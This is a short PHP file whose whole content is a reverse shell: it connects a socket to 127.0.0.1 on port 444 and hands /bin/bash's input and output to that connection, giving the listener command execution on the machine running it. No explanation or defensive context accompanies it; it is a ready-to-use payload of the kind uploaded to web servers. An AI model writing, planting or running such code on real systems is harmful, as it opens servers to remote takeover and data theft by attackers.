<?php 

$sock = fsockopen("127.0.0.1",444);
$proc = proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);

?>